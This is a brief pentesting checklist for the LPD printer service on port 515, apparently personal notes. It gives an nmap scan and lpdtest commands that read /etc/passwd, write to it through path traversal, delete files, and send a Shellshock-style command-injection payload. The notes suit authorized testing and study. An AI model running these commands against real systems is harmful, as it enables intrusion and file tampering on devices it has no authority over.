# LPD (Port 515) Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating LPD (port 515), I realistically expect:

- [ ] Print job upload/download capability
- [ ] Ability to read/write system files via path traversal
- [ ] Command injection via crafted print jobs (e.g. PostScript, PJL)
- [ ] Misconfigured printers exposing sensitive data

## ‚úÖ LPD Pentest Checklist

- [ ] **Identify Service**
    ```bash
    nmap -sV -p 515 <IP>
    ```

- [ ] **Test with PRET**
    - Upload / Download / Delete files, attempt command injection.
    ```bash
    lpdprint.py <IP> file.txt
    lpdtest.py <IP> get /etc/passwd
    lpdtest.py <IP> put ../../etc/passwd
    lpdtest.py <IP> rm /some/file/on/printer
    lpdtest.py <IP> in '() {:;}; ping -c1 1.2.3.4'
    ```
